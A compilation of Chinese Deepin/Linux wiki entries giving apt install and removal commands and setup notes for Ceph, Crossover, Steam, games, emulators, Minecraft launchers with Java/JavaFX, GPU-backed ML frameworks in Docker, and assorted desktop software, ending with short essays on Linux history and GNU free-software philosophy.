创建ceph群集时，需要首先使用ceph-deploy new命令初始化monitor，该命令会产生ceph.conf配置文件和密钥文件。之后通过ceph-deploy install安装工具，使用ceph-deploy mon create-initial初始化monitor。群集默认osd数量为3，可通过修改osd pool default size参数调整。

ceph支持三种存储方式：1）文件系统cephfs，2）块设备rbd，3）对象网关rgw（包含ceph-radosgw守护进程和civetweb前端）。部署模式包含安装相关apt包、配置管理密钥、编辑ceph.conf配置文件和重启守护进程。

在群集配置中，需要设置public_network和cluster_network参数。身份验证默认为cephx模式，需要配置三种访问权限：auth cluster required、auth service required和auth client required。

标题：Crossover运行Windows程序
Crossover是一款可以在Linux中运行Windows软件和游戏的工具。Crossover已经内置了常用的Windows程序，如Microsoft Office系列、Adobe Photoshop系列、魔兽世界等。使用Crossover，您不再需要Windows授权，不再需要双系统重启动，不再需要虚拟机，Windows程序就能与您的Linux系统无缝整合。

sudo apt-get install crossover
sudo apt-get install crossover-15
sudo apt-get install crossover-deepin

sudo apt-get remove crossover
sudo apt-get remove crossover-15
sudo apt-get remove crossover-deepin

http://packages.deepin.com/deepin/pool/non-free/c/crossover/
http://packages.deepin.com/deepin/pool/non-free/c/crossover-15/
http://packages.deepin.com/deepin/pool/non-free/c/crossover-deepin/

求如何创建crossover的desktop文件

标题：Desura游戏网站
Desura是一个正版游戏网站，游戏玩家只要登录，即可实现在任何PC上的即时游戏下载和购买。除此之外，Desura还提供游戏玩家社区和开发者社区的交流平台，为游戏开发者提供新闻分享、论坛及图片视频分享服务等。

安装Desura的命令是：sudo apt-get install desura

卸载Desura的命令是：sudo apt-get remove desura

Desura的仓库地址是：http://packages.deepin.com/deepin/pool/non-free/d/desura/

标题：Lutris
本词条用于介绍 Lutris 的安装使用和一些常见问题。 代码块符号规定：`#` 开头的命令指的是通过 `root` 用户 或普通用户使用 `sudo` 执行。 `$` 开头的命令指的是普通用户可直接执行。 `#` 或 `$` 无需在终端或其他位置打出。

Lutris 是一个 Linux 的开源游戏平台。它无需过多的设置即可开始安装运行游戏。可以从 GOG、Steam、Battle.net、Origin、Uplay 或其他地方获取可以在 Linux 上运行的游戏。[^Lutris介绍]

[^Lutris介绍]: [Lutris - Open Gaming Platform](https://lutris.net/)

深度系统可在深度商店中找到并安装 Lutris 本体。或者通过深度终端运行安装命令进行安装。 安装命令是： # apt install lutris

无法启动：点击 Play、Wine configuration 等按钮后会一直卡住，没有打开任何界面。 1. 尝试使用代理打开 Lutris。

标题：PlayOnLinux
PlayOnLinux是一款Wine的前端程序，它可以实现在Linux和Mac OS X上运行Windows应用程序，支持使用Dosbox来安装基于Dos的程序和游戏。

安装PlayOnLinux的命令是`sudo apt-get install playonlinux`

卸载PlayOnLinux的命令是`sudo apt-get remove playonlinux`

PlayOnLinux的仓库地址是http://packages.deepin.com/deepin/pool/contrib/p/playonlinux/

标题：Steam
Steam是一款方便迅速的综合性游戏平台，从动作游戏到独立游戏，各式各样，应有尽有。玩家可以在该平台上购买游戏、讨论和分享，也可以与您的好友一起进行跨平台的联机游戏。

sudo apt-get install steam

sudo apt-get remove steam

http://packages.deepin.com/deepin/pool/non-free/s/steam/

选择 Steam>>Settings(设置)>>Steam Play, 选勾 Enable Steam Play for all other titles ,Run other titles with 下拉列表选 Proton 7.0-3 并单击 OK 按钮

1. 对魔忍action 2. 泰坦陨落2 3. 刀剑神域SAO系列 4. 光明记忆(无限)系列 5. 方舟生存·进化 6. 收获日2 ...

Deepin社区文档:https://docs.deepin.org/pages/ab26ae/ (了解统信UOS游戏) 维基百科：

相关链接
Deepin社区文档:https://docs.deepin.org/pages/ab26ae/

标题：Steam说明2
Steam 是由 Valve 公司开发一个游戏平台。Proton 是 Steam 提供的修改版的 Wine，可以在 Linux 系统中运行部分 Windows 游戏。Steam 平台的游戏的兼容情况可以在 Protondb 查到。

缺失 32 位库的解决命令为：sudo apt-get install libgl1-nvidia-glvnd-glx:i386

强制打开 Steamplay 支持的方法：在设置中选择 Steamplay，可以强制启用 Proton。也可以在游戏库中右键游戏，为游戏选择特定版本的 Proton。

使用蒸汽平台：可以通过附加命令 -steamchina 进入中国版蒸汽平台。不过由于软件/游戏安装限制，不能通过安装 Proton 兼容层来运行 Windows 游戏，而只能游玩原生 Linux 游戏。

提示与技巧中的Steam++：Steam++ 是一个 Steam 辅助软件，提供本地反代、SAM 等功能。其Github 仓库地址是https://github.com/SteamTools-Team/SteamTools，Gitee 仓库地址是https://gitee.com/rmbgame/SteamTools。

标题：AssaultCube
AssaultCube是一款第一视角射击游戏，其目的在于创作一个崭新融入Cube简单风格但更加现实的游戏。它具有20多种游戏模式，支持在线网络双人对战、多人游戏、预安装了26个不同的地图，在游戏中，可以通过地图编辑器来帮助玩家创建自己的地图。

sudo apt-get install assaultcube

sudo apt-get remove assaultcube

http://packages.deepin.com/deepin/pool/contrib/a/assaultcube/

标题：Warsow
Warsow是一款第一人称射击游戏，游戏风格为明快的卡通风格。游戏中，玩家需要使用一切资源将敌人消灭。游戏包含的角色转换、武器扩展功能以及未来的科幻场景，将带您感受一个破坏者的乐趣。

安装命令：sudo apt-get install warsow 卸载命令：sudo apt-get remove warsow

软件仓库地址：http://packages.deepin.com/deepin/pool/non-free/w/warsow/

标题：Flail_Rider
Flail Rider是一款快节奏的桌面游戏，玩家可以驾驶一辆牵引连枷的赛车，自上而下地通过连枷打击一切地面物体，而且连枷的体积还可以变大，游戏操控起来非常简单，画面色彩也很丰富，整个过程令人惊叹刺激。

sudo apt-get install flailrider

sudo apt-get remove flailrider

[http://packages.deepin.com/deepin/pool/main/f/flailrider/f](http://packages.deepin.com/deepin/pool/main/f/flailrider/f)

安装：`sudo apt-get install flailrider` 卸载：`sudo apt-get remove flailrider`

标题：SuperTux
SuperTux是一款类似超级马里奥兄弟的游戏，在游戏中控制Tux企鹅通过跳起来顶砖块，吃到金币或雪球或者花，雪球可以使Tux企鹅长大，然后吃到花后可以发子弹。

sudo apt-get install supertux

sudo apt-get remove supertux

http://packages.deepin.com/deepin/pool/main/s/supertux/

维基百科：

标题：MAME
MAME是一个模拟器，也是国内玩家最熟悉和最常使用的街机模拟器之一。

MAME的游戏列表里有近3万个游戏，可以运行的游戏有数千个。

很多70后、80后曾迷恋的街机游戏，都可以在电脑上用MAME来运行。

MAME的安装命令是sudo apt-get install mame。

MAME汉化步骤：1、搜索【MAME官方版】下载一个Windows应用程序安装包EXE，右键选择解压到当前文件夹，找到【language】子文件夹中的【Chinese_Simplified】文件夹下的strings.mo语言文件，并以管理员身份复制到【/usr/share/games/mame/language/English】文件夹中。2、打开MAME，设置【configure option】中【customize UI】中【fonts】一项，选择一个中文字体，返回上一级菜单中保存设定即可。

MAME的卸载命令是sudo apt-get remove mame。

MAME的仓库地址是http://packages.deepin.com/deepin/pool/non-free/m/mame/。

MAME是一个模拟器，也是国内玩家最熟悉和最常使用的街机模拟器之一。MAME的游戏列表里有近3万个游戏，可以运行的游戏有数千个。很多70后、80后曾迷恋的街机游戏，都可以在电脑上用MAME来运行。

1、搜索【MAME官方版】下载一个Windows应用程序安装包EXE，右键选择解压到当前文件夹，找到【language】子文件夹中的【Chinese_Simplified】文件夹下的strings.mo语言文件，并以管理员身份复制到【/usr/share/games/mame/language/English】文件夹中。2、打开MAME，设置【configure option】中【customize UI】中【fonts】一项，选择一个中文字体，返回上一级菜单中保存设定即可。

标题：PPSSPP
PPSSPP是一款非常出色的PSP模拟器，可以流畅运行大部分的PSP游戏。PPSSPP支持中文，支持高清分辨率以及自适应分辨率，并且支持即时存档和读取存档。除此之外，PPSSPP还支持外接手柄进行游戏，完美满足追求手感和流畅操控的游戏玩家。

sudo apt-get install ppsspp

sudo apt-get remove ppsspp

http://packages.deepin.com/deepin/pool/main/p/ppsspp/

标题：Snes9x
Snes9x是一款超级任天堂SFC模拟器，能流畅运行市面上大部分经典的游戏。Snes9x支持游戏的保存和载入，支持实体键盘和虚拟键盘，可以让玩家再次体验超级任天堂曾经的辉煌。

sudo apt-get install snes9x-gtk

sudo apt-get remove snes9x-gtk

http://packages.deepin.com/deepin/pool/non-free/s/snes9x/

标题：我的世界
《我的世界》（Minecraft）是一款开放世界沙盒游戏，玩家可以自由探索、建造和冒险，支持Java版（跨平台）和基岩版（多设备联机）。

Deepin上游玩我的世界Java版最低配置：CPU为Intel Core i3-3210 3.2GHz、AMD A8-7600 APU 3.1GHz等或同等效能的CPU；芯片架构包括ARM、x64、x86、LoongArch、RISC-V；内存2GB。

Deepin上游玩我的世界Java版推荐配置：CPU为Intel Core i5-4690 3.5GHz、AMD A10-7800 APU 3.5GHz等或同等性能的CPU；芯片架构包括ARM、x64、x86、LoongArch、RISC-V；内存4GB。

Deepin当前可用Minecraft Java启动器：官方启动器、HMCL、XMCL、LauncherX、Modrinth启动器等。即将到来的有BakaXL4、PCL.Neo等。

HMCL启动器的.jar文件启动命令为java -jar HMCL-xxx.jar；.sh文件启动可用./HMCL-xxx.sh或双击；.exe文件启动用java -jar HMCL-xxx.exe。

下载Java的方式：OpenJDK可通过sudo apt-get install openjdk-8-jre下载openjdk8，或前往官网下载9及以上版本；Oracle JDK需前往其官网下载。

我的世界Java版1.20.5（24w14a）最低Java版本为Java 21；1.18（1.18-pre2）为Java 17；1.17（21w19a）为Java 16；1.12（17w13a）为Java 8。

Nvidia卡用户在Deepin上用独显启动我的世界Java版，可安装任务栏显卡切换插件后右键选择使用prime-run运行，或创建prime-run脚本，或设置环境变量等。

Deepin上可使用Mcpelauncher来游玩我的世界基岩版，它是针对Android版Minecraft基岩版的第三方启动工具，支持在Linux和MacOS系统运行。

mcpelauncher的安装方式有：使用apt仓库安装，输入sudo apt update和sudo apt install相关包；使用Flatpak安装，输入sudo flatpak install flathub io.mrarm.mcpelauncher等。

《我的世界》（Minecraft）是一款开放世界沙盒游戏，支持Java版（跨平台）和基岩版（多设备联机）。在Deepin系统上运行Java版需满足硬件需求：最低配置要求CPU为Intel Core i3-3210 3.2GHz、AMD A8-7600 APU 3.1GHz等，内存2GB；推荐配置要求CPU为Intel Core i5-4690 3.5GHz、AMD A10-7800 APU 3.5GHz等，内存4GB。

Deepin可用Java版启动器包括：官方启动器、HMCL、XMCL、LauncherX、Modrinth启动器。HMCL启动方式：需预装JDK11+，可通过.jar文件（命令：java -jar HMCL-xxx.jar）或.sh文件启动。创建桌面快捷图标需编写.desktop文件，指定Exec路径及图标。

游戏需安装对应Java版本：Minecraft 1.20.5需Java 21，1.18需Java 17。可通过apt安装OpenJDK或下载Oracle JDK。NVIDIA显卡启动方法：1. 使用任务栏插件右键选择prime-run；2. 创建prime-run脚本设置环境变量；3. 在启动器环境变量输入__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia。

基岩版可通过mcpelauncher启动，需已购买安卓版账号。安装方式：1. 添加apt仓库安装；2. Flatpak全局安装。NVIDIA显卡启动需在环境变量设置__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia。当前问题：不支持光线追踪和输入法。

标题：我的世界minecraft在linux中配置 hmcl
我的世界是一个广受欢迎的沙盒游戏，最重要的是，它基于java技术，因此也能正常运行在linux中。不过在linux中，有一些需要注意的事项。 首先是官方 java 的授权问题，据说 java 8 还是有 bsd 授权的，但是为了避免著作权的纠纷，我们还是想办法是用 openjdk 比较好。 openjdk 是开源的java 运行时。对于我的世界本身而言，openjdk 不会存在太大的兼容性问题，但是如果你是使用一个叫 hmcl 的我的世界登陆器来玩游戏，它使用了一个叫 javafx 的图形界面框架，需要你配置第三方类库。

Bellsoft 公司维护着 Liberica 系列产品，其完整版 JDK/JRE 附带 JavaFX。下载链接：https://bell-sw.com/pages/downloads/。1. 选择 JDK 8 LTS（也可以选 JDK 11 LTS）2. 向下滚动到 Linux 一栏3. 确认选择的是 x864. 下拉菜单选择 JRE Full5. 右侧点击下载 DEB 包并安装。以上安装方法不经过包管理器，所以 Java 未来不会被 apt upgrade 这类指令自动更新。如果你想要自动更新，建议通过 Bellsoft 的 APT 仓库安装。在命令行中依次执行：wget -q -O - https://download.bell-sw.com/pki/GPG-KEY-bellsoft | sudo apt-key add -；echo "deb https://apt.bell-sw.com/ stable main" | sudo tee /etc/apt/sources.list.d/bellsoft.list；sudo apt update。安装 JRE 8 + JFX 请运行 sudo apt install bellsoft-java8-runtime-full；安装 JRE 11 + JFX 请运行 sudo apt install bellsoft-java11-runtime-full。

除了 Bellsoft 的 Liberica 以外，Azul 公司的 [Zulu](https://www.azul.com/downloads/) 也提供捆绑 JavaFX 的版本，但他们的安装包只有tar.gz格式的。

我的世界低版本会对java的版本有一定的显示，通常来说java 8 或者 1.8 是兼容性最好的。高版本的java我也不知道带来什么好处，暂时没有看到。如果你需要制作安装包，提供给别人使用，最好就是绑定 java 8 的运行时。不过 javafx 和 java 分离之后，独立发展，现在长期支持的版本是 javafx 11，对javafx8 支持不太有好。而 hmcl 暂时还不支持openjdk11 以上。鉴于种种原因，我选择了 openjdk11 + javafx11 这样的组合。javafx 的开源名字是openjfx。

openjdk11 下载地址：<https://github.com/AdoptOpenJDK/openjdk11-binaries/releases>。页面比较复杂。下载一个新版本即可。注意几个关键词，x64,linux,openj9,jre。 jre是运行时，不带开发组件，对我们运行来说足够了，但是如果你想制作整合openjfx的捆绑java，就要下载sdk版本。 openj9 和 hotspot 是java虚拟机的技术，其中openj9比较省内存，因此可以选择这个。 hotspot是甲骨文官方支持的，也可以选择。 x64 和 linux 就是平台的版本。

openjfx11 下载地址：<https://gluonhq.com/products/javafx/>。注意几个关键词， `javafx linux sdk` 这个包含了.jar库，可以用命令行来调用运行。 `javafx linux jmods` 是一种编译时插件，可以用来制作捆绑 javafx 的新 java 运行时。为了方便起见，制作捆绑包在用户使用时会相对比较简单一些。

分离式运行 hcml：这个需要 jre11 + jfx11 sdk。```bash# 假设jdk11解压缩出来是jdk-11.0.8+2=jre# 假设javafx11解压出来是 javafx-sdk-11.0.2# 假设 hmcl 是 hmcl.jar# 以下命令即可正常使用./jdk-11.0.8+2-jre/bin/java -p javafx-sdk-11.0.2/lib --add-modules ALL-MODULE-PATH -jar hcml.jar```

捆绑包运行 hcml：这个需要 jdk11 + jfx11 jmods。```bash# 假设 jdk11 解压出来是jdk-11# 假设 jfx11 jmods 解压出来是 javafx-jmods-11.0.2# 输出整合包到 jdk11jfx11 目录./jdk-11/bin/jlink --module-path javafx-jmods-11.0.2/ --add-modules javafx.base,javafx.fxml,javafx.media,javafx.web,javafx.controls,javafx.graphics,javafx.swing,java.base,java.desktop,java.logging,java.management,java.sql,java.xml,jdk.unsupported --bind-services --output jdk11jfx11# 运行 hcml./jdk11jfx11/bin/java -jar hcml.jar```

当前版本hcml 3.3.158 依赖的包：1. java.base1. java.desktop1. java.logging1. java.management1. java.sql1. java.xml1. javafx.base1. javafx.controls1. javafx.fxml1. javafx.graphics1. javafx.swing1. javafx.web1. jdk.unsupported

怎么知道 hcml 依赖什么包？```bash# 使用jdk 的一个叫 jdeps 的工具可以检查./jdk-13/bin/jdeps --list-deps --multi-release=11 *.jar```

参考：1. openjdk8 下载地址： <https://github.com/AdoptOpenJDK/openjdk8-upstream-binaries/releases/>2. Java 9：使用第三方jar生成JLink的运行时映像: <https://stackoom.com/question/3H7FW/Java-%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9jar%E7%94%9F%E6%88%90JLink%E7%9A%84%E8%BF%90%E8%A1%8C%E6%97%B6%E6%98%A0%E5%83%8F>

当前长期支持的Javafx版本是什么？现在长期支持的版本是 javafx 11。hmcl 暂时还不支持openjdk11 以上。作者选择的组合：openjdk11 + javafx11。openjfx 是 javafx 的开源名称。下载openjdk时需要注意的关键词：x64,linux,openj9,jre。分离式运行hmcl的命令：./jdk-11.0.8+2-jre/bin/java -p javafx-sdk-11.0.2/lib --add-modules ALL-MODULE-PATH -jar hcml.jar捆绑包制作命令：./jdk-11/bin/jlink --module-path javafx-jmods-11.0.2/ --add-modules javafx.base,javafx.fxml,javafx.media,javafx.web,javafx.controls,javafx.graphics,javafx.swing,java.base,java.desktop,java.logging,java.management,java.sql,java.xml,jdk.unsupported --bind-services --output jdk11jfx11运行捆绑包：./jdk11jfx11/bin/java -jar hcml.jar检测依赖包的命令：./jdk-13/bin/jdeps --list-deps --multi-release=11 *.jar

标题：Stunt_Rally
Stunt Rally是一款赛车游戏，玩家可以从153条赛车轨道和24个关卡中感受到游戏的魅力。游戏设置有锦标赛、挑战赛以及多人比赛等，除此之外，Stunt Rally允许用户实时编辑比赛道路和它们的参数，通过改变赛道的参数、调整地形，甚至修改自己的赛车，从而让驾驶乐趣倍增。

sudo apt-get install stuntrally

sudo apt-get remove stuntrally

http://packages.deepin.com/deepin/pool/contrib/s/stuntrally/

标题：SuperTuxKart
SuperTuxKart 是一款开源的三维街机赛车游戏，内含多种角色、赛道和游戏模式

通过此链接 https://supertuxkart.net/zh_CN/Download 下载对应架构的游戏，解压并执行运行脚本

标题：ML训练框架环境搭建篇
本次试验准备的软硬件基础环境：系统 Deepin 20.6，CPU Intel i9-10900k，显卡 Nvidia RTX3090，内存 Corsair 32G DDR4 2133MHZ ×2，硬盘 Micron SSD 512G + Western Digital Corp HDD 2TB。

检查是否安装NVIDIA闭源驱动需在终端执行命令nvidia-smi；若命令报错或不存在，需去NVIDIA官网下载驱动，deepin系统在官网选择Operating System为Linux 64 bit。

deepin安装NVIDIA闭源驱动步骤：1.按Ctrl+Alt+F2打开tty，输入用户名密码后执行sudo init 3关闭图形界面；2.用sudo sh /YourSavePath/xxx.run安装驱动；3.安装完成后reboot重启，运行nvidia-smi或nvidia-settings验证。

deepin安装Docker CE：先执行sudo apt update更新源，再用sudo apt install docker-ce安装；测试用sudo docker run hello-world，出现对应界面则安装成功。

安装nvidia-container-toolkit：添加源用curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -和curl -s -L https://nvidia.github.io/nvidia-docker/debian10/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list；再执行sudo apt update、sudo apt install -y nvidia-container-toolkit，最后sudo systemctl restart docker；测试用sudo docker run --gpus all --rm nvidia/cuda:11.0-base nvidia-smi。

部署Pytorch：选1.11.0-cuda11.3-cudnn8-devel镜像，拉取命令加sudo；启动命令为sudo docker run -it --gpus all -v /home/deepin/Desktop/mnist/pytorch:/test pytorch/pytorch:1.11.0-cuda11.3-cudnn8-runtime /bin/bash，进入后cd /test，执行python3 train.py，训练设备为CUDA则成功。

部署TensorFlow：拉取镜像命令为sudo docker pull tensorflow/tensorflow:latest-gpu；启动命令为sudo docker run -it --gpus all -v /home/deepin/Desktop/mnist/tensorflow:/test tensorflow/tensorflow:latest-gpu /bin/bash，cd /test后执行python train.py；五个EPOCH用时9.3825秒，ACC 97.73%，LOSS 0.756。

部署PaddlePaddle：拉取镜像命令为sudo docker pull paddlepaddle/paddle:2.0.1-gpu-cuda11.0-cudnn8；启动命令为sudo docker run -it --gpus all -v /home/deepin/Desktop/mnist/paddlepaddle:/test paddlepaddle/paddle:2.0.1-gpu-cuda11.0-cudnn8 /bin/bash；五个EPOCH用时10.3678秒，ACC 98.57%，LOSS 0.0850，成功调起cuDNN库。

本次搭建总结：在deepin中安装支持CUDA的闭源显卡驱动；用Docker CE和对应镜像部署Pytorch、TensorFlow、PaddlePaddle；在Docker内成功调用GPU训练模型。

在 deepin 社区版 20.6 发布后，社区小伙伴对在 deepin 上如何进行机器学习表现出浓厚的兴趣。为此，咱们趁热打铁的介绍 Pytorch、TensorFlow、PaddlePaddle 三款主流训练框架在 deepin 的环境搭建全过程，其中不乏踩过的坑和收获的经验，包括在Linux上安装显卡驱动、配置 Docker、部署训练框架等。

我们首先从显卡驱动的安装谈起，因为众所周知，在机器学习领域利用显卡对模型进行计算和加速发挥作用举足轻重的作用。这里的显卡驱动安装指的是安装 NVIDIA 的闭源驱动，不使用开源的 nouveau 驱动的原因是它无法调起 NVIDIA 显卡内部的 CUDA 单元，也无法使用 NVIDIA 的 cuDNN 库为整个训练过程进行加速等等。

首先我们需要在终端中执行命令 nvidia-smi 来检查是否已经安装了 NVIDIA 闭源驱动。nvidia-smi（简称 NVSMI）是一个跨平台工具，主要提供监控 NVIDIA GPU 使用情况和更改 其状态的功能，这个工具是 N 卡闭源驱动附带的，驱动安装好之后就会有这个命令，反之如果没能正确配置 N 卡的闭源驱动，则执行此命令会产生报错。

在NVIDIA 官网查询显卡匹配的驱动版本（https://www.nvidia.com/Download/index.aspx)，对于 deepin 而言，Operating System 一栏直接选择 Linux 64 bit 即可，其余选项则根据自己显卡的情况进行选择即可。而本次教程的选择如下图所示：

第一步：按组合键（<kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>F2</kbd>） 打开 tty ，按照提示输入用户名和密码，然后执行 sudo init 3 关闭图形界面；

在 tty 中使用 `sudo sh /YourSavePath/xxx.run` 命令安装显卡驱动，其中 YourSavePath 是你的 xxx.run 文件的保存位置，你也可以像我一样，先把目录切到目标位置，然后执行 `sudo sh xxx.run`。随后就会进入正式的安装过程：

等待安装完成且没有报错后，使用 `reboot` 命令重启系统，然后在终端中运行 `nvidia-smi` 命令查看显卡相关信息，或是使用 `nvidia-settings` 命令可以打开 NVIDIA 图形设置界面。若这两个命令均可运行则说明显卡驱动安装成功。

更新源
```
$ sudo apt update
```

添加源，可手动选择使用 debian 10 的包
```
$ curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -

$ curl -s -L https://nvidia.github.io/nvidia-docker/debian10/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list
```

当看到和直接执行 nvidia-smi 命令的输出差不多的界面时，即表示我们的 docker 环境可以正确调起部署在宿主机上的 N 卡。

标题：GnuCash
GnuCash是一款适用于个人或小型企业的财务软件，包含有收入支出记录、帐户管理、税务管理等，就像日常纸质账簿一样可以直观并且快速的使用，以确保平衡的账簿和精准的报表。

sudo apt-get install gnucash

sudo apt-get remove gnucash

http://packages.deepin.com/deepin/pool/main/g/gnucash/

标题：Stellarium
Stellarium是一款虚拟星象仪的计算机软件，是天文爱好者学习夜空知识，进行星空观测必备的辅助软件。stellarium拥有高清的画质，可以真实地模拟出肉眼、望远镜所看到的天空、虚拟出各种天文现象，绘制出各种星图等。

sudo apt-get install stellarium

sudo apt-get remove stellarium

http://packages.deepin.com/deepin/pool/main/s/stellarium/

标题：扫描探针显微镜数据可视化和分析工具Gwyddion
Gwyddion是一款模块化扫描探针显微镜数据可视化和分析工具。主要是它的目的是为分析领域所取得的高度扫描探针显微技术(原子力显微镜，磁力显微镜，扫描隧道显微镜，扫描/ NSOM ) ，但通常可以用于任何其他高度场和图像分析，例如分析的轮廓数据 。

sudo apt-get install gwyddion

sudo apt-get remove gwyddion

http://packages.deepin.com/deepin/pool/main/g/gwyddion/

标题：千牛工作台
千牛工作台是阿里巴巴官方出品的卖家一站式店铺管理工具，卖家可以通过它发布经营资讯消息、商业伙伴关系，借此提升卖家的经营效率，促进彼此间的合作共赢，让卖家可以更加便捷和高效的管理店铺，让生意游刃有余。

sudo apt-get install apps.com.taobao.aliclient.qianniu

sudo apt-get remove apps.com.taobao.aliclient.qianniu

http://packages.deepin.com/deepin/pool/non-free/a/apps.com.taobao.aliclient.qianniu/

标题：BOINC
简介

BOINC是一款用来贡献计算资源的应用。你可以通过BOINC应用贡献你计算机的闲置时间，来帮助如疾病治疗、全球变暖、发现脉冲星等多种类型的科学研究项目，研究人员可以方便地获得分布在世界各地的志愿者的计算资源。

安装

`sudo apt-get install boinc`

卸载

`sudo apt-get remove boinc`

仓库地址

`http://packages.deepin.com/deepin/pool/main/b/boinc/`

标题：BeginnerTutorials起源
Linux 是由一个内核演变成一款操作系统的, 而内核是由 Linus Torvalds 创建的, 创建的时候他还是 Helsinki 大学的一名学生. 通常情况下这就是大部分人眼中的 Linux. 然而, 出于政治和实际原因, 它需要被进一步解释. 说 Linux 是一个操作系统, 意味着它将被用作其它系统的替代品, 比如 Windows, Mac OS, MS-DOS, Solaris 和其它系统. Linux 不是一个程序像是文本处理工具同时它也不是一个办公软件的集合体. Linux 是一个接口平台, 连接着电脑或服务的硬件与运行在上面的程序.

当 Linus Torvalds 还在 Helsinki 大学上学的时候, 他当时学习的是 UNIX 类型的操作系统, 名字叫做 Minix. Linus 和其他用户给 Minix 的系统作者发出请求, 希望可以帮助编辑并改善此系统. 而当时 Minix 的系统维护者 Andrew Tanenbaum 觉得 Minix 作为教学演示的系统已经足够了, 不需要修改和更新. 也正是此事之后, Linus 开始决定创建他自己的操作系统, 一开始便考虑到用户的意见和改进建议.

通过用户的意见或者建议来改善电脑程序的做法是有先例的. Richard Stallman 是一位曾工作于麻省理工学院的人, 他最早于20世纪70年代提倡使用这种方式来改善计算机编程.他是自由软件运动的急先锋, 总是指出 free 的含义是自由而不是免费. 当他发现继续工作将会违背自由软件运动的信念时, 他离开了 MIT 并成立了 GNU 组织, 那一年是1984年. GNU 组织的目标是作出可以被自由使用-分发-修改的软件. 这个目标和六年后 Linus Torvalds 的目标基本一致, 他也想创造一款可以被用户自由讨论的操作系统.

我们需要指出的是, 任何操作系统的核心都是它的内核. 简单来说, 内核就是告诉芯片如何控制你的计算过程, 也就是编程后具体的执行过程. 打个比方, 如果你去你最喜欢的饭馆然后点了一份黄焖鸡米饭, 端饭的碗就像是操作系统. 碗里面可以放饭菜, 比如西红柿炒鸡蛋盖饭, 炒土豆丝盖饭, 酱油炒饭和排骨拌饭等等. 额...内核就好比米饭, 没有了米饭碗也就不需要了. 吃米饭最好就着菜, 单吃米饭噎得慌. 没有了内核, 操作系统也就不复存在了. 没有了程序, 内核将毫无用处.

在1991年, 存在着理想条件来创建 Linux. 当时, Linus Torvalds 有一个内核, 但自己没有程序运行在上面, Richard Stallman 和他的 GNU 组织有开源的程序但没有可以运行的开源内核. Linus 说：很遗憾, 内核本身不会给你带来任何好处. 相要让它工作你需要一个shell, 一些编译器, 一些库等. RMS 说：当前的 GNU Hurd (也是一个系统内核)在生产环境下并不可用. 幸运的是, 另一个内核是可以的, 它的名字是 Linux. 因此，将马萨诸塞州剑桥的 GNU 提供的必要程序与芬兰赫尔辛基的 Linus Torvalds 开发的内核相结合，Linux 系统诞生了. 由于两者间的物理距离过远, 于是他们在互联网中走到了一起, 这便是起步阶段. 互联网也将在 Linux 的后续开发中发挥关键作用, 作为协调所有开发人员工作的手段, 也是这些开发人员将 Linux 打造成今天的样子。

1991年的后续, Linus Torvalds 有了他自己的内核和一些可执行的 GNU 程序, 这些程序运行良好, 可以被展示给其他人看到他所作出的成果. 这也是他当时主要做的事情. 第一个看到 Linux 的人只意识到 Linus 正在做某个说不上来但很厉害的东西. 此刻, Linus需要更多的人来帮助他. Linus 说：你是不是没有一个好的系统, 深切的渴望着有一个操作系统可以随意的修改为你需要的样子?... 这篇帖子或许就是你需要的. 全世界的人都想要帮助他. 起初, 只有拥有大量计算机编程知识的人才可以在 Linux 早期版本上开发, 他们开始提供他们独有的能力. Linux的版本号也变得越来越高. 人们开始写一些只能在 Linux 平台上运行的程序. 开发者开始为不同的显卡,声卡和其它小工具写驱动程序, 只要是你电脑中 Linux 系统希望用到的内部或外部的东西都可以尝试开发. 尽管如此, 在20世纪90年代的大部分时间里 Linux 都没有走出 GURU 阶段. GURU 代表着某些特殊经验的人在一个特定领域的项目. 换句话说, 在那段时间里你必须拥有编程工作方面的特定经验才有能力安装 Linux 系统. Linux, 第一次, 并不是给所有人准备的. 其他流行的软件公司在当时会出售给你一个 CD 或者一堆软盘和一个简短的使用说明书, 同时用不了半个小时, 你将在你的 PC 电脑上安装一个完整的可工作的操作系统. 必备的能力是你了解如何阅读说明书. 这些公司真正静下心来研发他们的操作系统时就已经有了这个意图. Linus Torvalds 在开发 Linux 的时候没有这个想法, 这对他来说是个人爱好. 后来, 很多公司比如红帽, 他们订立目标将Linux 开发成可以和任何其他操作系统一样安装方便, 任何人都可以跟随简单的指令即可安装成功的样子.

今天, Linux 在很大程度上受到了好评. 这是因为 Linux 已经被证明是一个非常稳定和通用的操作系统, 特别是作为网络服务器. 当Linux 被作为 web 服务器或公司网络服务部署上去, 它的停机时间几乎可以忽略不计. 有些情况下, Linux 服务器已经运行了一年多而没有重新启动, 然后只是为了例行维护而短暂停机. 它的性价比比其他任何东西都更让它卖的好. Linux 可以被安装到一台家用 PC 就像一台网络服务器, 成本仅为其他公司软件包的一小部分. 高可靠性和低成本非常的理想. 如果你正在读这篇文章, 你显然是来学习如何使用 Linux 的. 任何学习经历都意味着接受新的想法和新的做事方式. 如前所述, Linux 属于类 Unix 系统, 而 Unix 系统主要是为专业人员设计的. 在入门 Linux 的时候必须学一些 Unix 概念, 但这并不意味着 Linux 是一个只有专业人士才可以使用的操作系统. 事实上, Linux 的大多数发行版本都被设计为与当今市场上任何其他操作系统一样易于使用和安装.

标题：GNU的哲学
GNU是一个自由软件操作系统，自由软件意味着使用者有运行、复制、发布、研究、修改和改进该软件的自由。GNU是一个100%由自由软件构成的操作系统。它由 Richard Stallman（rms）在1983年发起，并由许多珍视软件用户自由的人士共同协作开发。技术上，GNU大致类似Unix。但是和Unix不同，GNU给予其用户自由。

自由软件尊重用户的自由，并且尊重整个社区。粗略来讲，一个软件如果是自由软件，这意味着用户可以自由地运行，拷贝，分发，学习，修改并改进该软件。因此，自由软件是关乎自由的问题，与价格无关。要理解这个概念，你要按照 Free Software 中的Free是指自由言论（free speech）中的自由，而非免费午餐（free lunch）的免费这一意项。为避免歧义，在使用英文时，我们也会借用法语或西班牙语的Libre Software来指自由软件，这样可以明确表示我们说得不是免费。

